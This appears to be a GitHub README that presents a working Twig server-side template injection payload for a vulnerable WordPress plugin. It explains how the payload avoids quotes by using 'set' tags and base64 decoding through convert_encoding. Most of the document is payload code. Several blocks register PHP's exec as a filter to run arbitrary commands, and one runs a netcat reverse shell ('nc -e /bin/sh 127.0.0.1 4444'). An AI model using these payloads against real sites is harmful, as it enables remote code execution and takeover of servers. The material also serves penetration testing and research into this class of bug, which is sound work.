# twig-ssti-alternative-payload

## TL;DR

Use this payload (or twig_base64.rb Metasploit encoder module) to bypass magic quotes in Twig SSTI vulnerabilities

~~~
{%set a%}UTF-8{%endset%}{%set b%}BASE64{%endset%}{%set p%}base64 encoded string{%endset%}{%set p = p|convert_encoding((a), (b))%}{%set e%}exec{%endset%}{{_self.env.registerUndefinedFilterCallback(e|lower)}}{{_self.env.getFilter(p)}}
~~~

## Overview

While developing an exploit that takes advantage of an SSTI vulnerability leveraging the Twig template engine, I encountered an issue passing quotes in requests to the vulnerable Wordpress plugin because of Wordpress's use of magic quotes.

### Original Twig SSTI Expression

As you can see quotes are required in the following typical Twig SSTI expression...

~~~
{{ _self.env.registerUndefinedFilterCallback("exec") }} {{ _self.env.getFilter("nc -e /bin/sh 127.0.0.1 4444") }}
~~~

### New and Improved (part 1) Twig SSTI Expression

After fumbling around with the Twig template syntax, I found a solution that will hopefully help someone else running into a similar issue.

Essentially Twig allows you to set variables without using quotes by using the "set" tag. Internally this creates a "Twig_Markup" object which will raise an error when ultimately passed to call_user_func() in Twig/Environment.php

To convert the newly initialized variables back to a string, the slice operator "[:]" is applied without any arguments so the full string is returned.

~~~
{%set c%}nc -e /bin/sh 127.0.0.1 4444{%endset%}{%set e%}exec{%endset%}{{_self.env.registerUndefinedFilterCallback(e|e[:])}}{{_self.env.getFilter(c|c[:])}}
~~~

This Twig syntax allows issuing commands, but it doesn't allow us to use quotes or backslashes in the payload.

### New and Improved (part 2) Twig SSTI Expression

To get around this limitation we can base64 encode the payload and then use the convert_encoding Twig filter to decode it, allowing us to use quotes and backslashes.

#### Sets target and source encoding variables

~~~
{%set a%}UTF-8{%endset%}{%set b%}BASE64{%endset%}
~~~

#### Defines the payload

~~~
{%set p%}base64 encoded string{%endset%}
~~~

#### Decodes base64 encoded payload

~~~
{%set p = p|convert_encoding((a), (b))%}
~~~

#### Registers fallback callback exec filter and executes it with decoded payload

I opted to use the lower filter instead of string slicing for registering the exec filter to limit the necessary characters.

The convert_encoding filter converts the payload to a string, so slicing also isn't required here.

From here the payload works in the usual way which I won't go into since it's pretty well documented. For the curious, you can find more information [here](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md#twig-cve-2022-23614) among many other resources.

~~~
{%set e%}exec{%endset%}
{{_self.env.registerUndefinedFilterCallback(e|lower)}}
{{_self.env.getFilter(p)}}
~~~

#### Entire Payload

~~~
{%set a%}UTF-8{%endset%}{%set b%}BASE64{%endset%}{%set p%}base64 encoded string{%endset%}{%set p = p|convert_encoding((a), (b))%}{%set e%}exec{%endset%}{{_self.env.registerUndefinedFilterCallback(e|lower)}}{{_self.env.getFilter(p)}}
~~~
